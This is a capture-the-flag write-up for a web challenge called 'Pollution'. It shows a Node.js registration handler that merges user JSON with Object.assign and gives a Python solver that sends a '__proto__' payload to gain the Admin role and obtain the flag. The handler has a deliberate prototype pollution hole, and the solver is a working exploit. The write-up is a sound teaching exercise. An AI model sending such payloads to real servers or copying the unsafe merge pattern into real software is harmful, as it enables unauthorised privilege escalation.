# Web - Pollution
* Given source code and link to a website.

File: server.js
```
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body);
    
    // Haha, even you can set your role to Admin, but you don't have the secret!
    if (user.role == "Admin") {
        console.log(user.secret);
        if(user.secret !== secret.value) return res.send({
            "message": "Wrong secret! no Admin!"
        });
        return res.send({
            "message": "Here is your flag!",
            secret: secret.value
        });
    }
    
    let newUser = Object.assign(baseUser, user);
    if(newUser.role === "Admin") {
        return res.send({
            "message": "Here is your flag!",
            secret: secret.value
        });
    }

    else return res.send({
        "message": "No Admin? no flag!"
    });
})
```
* If we look closer, in server.js, we can find function `Object.assign()`

```
...
let newUser = Object.assign(baseUser, user);
...
```

* We know that we can control `user` variable

```
...
let user = JSON.parse(req.body);
...
```

* `Object.assign()` can be manipulated to perform prototype pollution.
* To solve this challenge, since we don't know the value of `secret.value`, we need to skip the `user.role == "Admin"` condition. Check out the following part of `server.js` below :

```
...
    if (user.role == "Admin") {
        console.log(user.secret);
        if(user.secret !== secret.value) return res.send({
            "message": "Wrong secret! no Admin!"
        });
        return res.send({
            "message": "Here is your flag!",
            secret: secret.value
        });
    }
...
```
* Since we have `Object.assign(baseUser, user)` function and we can control the `user` variable from `req.body`, then we can perform Prototype Pollution through `req.body`.

# My Solver :
```
import requests
import json

url = 'http://target/register'

headers = {
	'Content-Type': 'text/plain'
}

payload = {
	"__proto__" : {
		"role": "Admin"
	}
}

r = requests.post(url, headers=headers, data=json.dumps(payload))

print(r.text)
```

